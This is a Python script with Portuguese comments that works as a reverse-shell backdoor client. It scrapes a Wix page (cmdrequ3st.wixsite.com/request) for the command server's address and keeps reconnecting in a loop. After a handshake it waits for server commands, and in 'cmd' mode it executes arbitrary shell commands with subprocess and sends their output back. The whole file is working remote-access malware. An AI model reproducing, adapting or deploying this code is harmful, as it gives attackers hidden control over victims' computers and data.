import os
import socket
import subprocess
import requests
from bs4 import BeautifulSoup


#hostname = socket.gethostname()
#print(hostname)

#criando função que retorna uma tupla com host e porta do servidor (que foram atualizados no site https://cmdrequ3st.wixsite.com/request)
def pegando_ip_com_webscrapping():
    #definindo um header de navegador para request
    header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36'}
    #definindo página onde o ip foi publicado
    pagina = requests.get('https://cmdrequ3st.wixsite.com/request', headers=header)

    #alocando o conteúdo html da página na variável soup
    soup = BeautifulSoup(pagina.content, 'html.parser')

    #alocando todo o conteúdo de h1 (um título em html) que tenha um style="font-size:88px;" 
    #na variável ip por exemplo: <h1 class="font_0" style="font-size:88px;">CONTEUDO DO TITULO</h1>
    ip = str(soup.find_all("h1", style="font-size:88px;")[0])

    #pegando só o que importa de h1 apenas manipulando strings (CONTEÚDO DO TITULO)
    find = ip.find('>')
    ip = ip[(find + 1):]
    find = ip.find('<')
    ip = ip[:find]
    content = ip.split()
    tupla = (content[0],int(content[1]))
    return tupla











while True:
    while True:
        try:
            #--------configuracoes do socket cliente -------------------
            cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #pega uma tupla com ip e porta da função.
            tupla = pegando_ip_com_webscrapping()
            #conecta o socket do cliente no servidor
            cliente.connect(tupla)
            #SE conseguir conectar ao servidor, recebe uma mensagem do servidor para saber se é o servidor correto
            #SE NÃO conseguir conectar, cai na except e retorna para tentar a conexção novamente no try: acima
            mensagem = cliente.recv(1024).decode()
            #Caso o servidor conecte, independente de ser o servidor certo ou nao, e mande uma mensagem, tratar a 
            #mensagem para saber se é o servidor correto.
            
            if mensagem != 'Você se conectou com o servidor!':
                #caso o servidor seja diferente, volta para tentar fazer conexão novamente.
                print('Tráfego cruzado! refazendo conexão!')
                pass
            else:
                #caso o servidor seja o correto, quebra o while de conexão e entra na parte de receber instrução do servidor.
                print(mensagem)
                break
        except:
            
            print('Servidor fechado, tentando novamente...')
    #após conexão bem sucedida, e validação do servidor, receber do server um comando.
    try:
        #recebendo comando do servidor
        comando = cliente.recv(1024).decode()
        #comando recebido com sucesso, vamos tratar o comando.
        
        if comando == 'reload':
            #se o comando for reload, o server quer que você encerre conexão com ele e conecte novamente, então, volta para conexão inicial.
            pass
        elif comando == 'free':
            #se o comando for free o servidor está libertando o cliente, encerrando o programa.
            break
        elif comando == 'cmd':
            while True:
                print('esperando comando.....')
                cmd_comando = cliente.recv(1024).decode()
                if cmd_comando != 'leave':
                    cmd = subprocess.Popen(args=cmd_comando, shell=True, stdout=subprocess.PIPE,
                                                        stderr=subprocess.PIPE,
                                                        stdin=subprocess.PIPE)
                    output = (cmd.stdout.read() + cmd.stderr.read()).decode('Utf-8', errors='ignore')
                    if len(output) != 0:
                        cliente.send(str.encode(str(output)))
                    else:
                        cliente.send(str.encode('Comando sem output$'))
                    
                else:
                    break

    except:
        #caso haja um erro no recebimento do comando, ou o servidor interrompa conexão na hora do recebimento, volta para conexão inicial.
        pass
    
print('free')
#cliente.send(str.encode(str(input('Digite sua mensagem:'))))
    
    
    



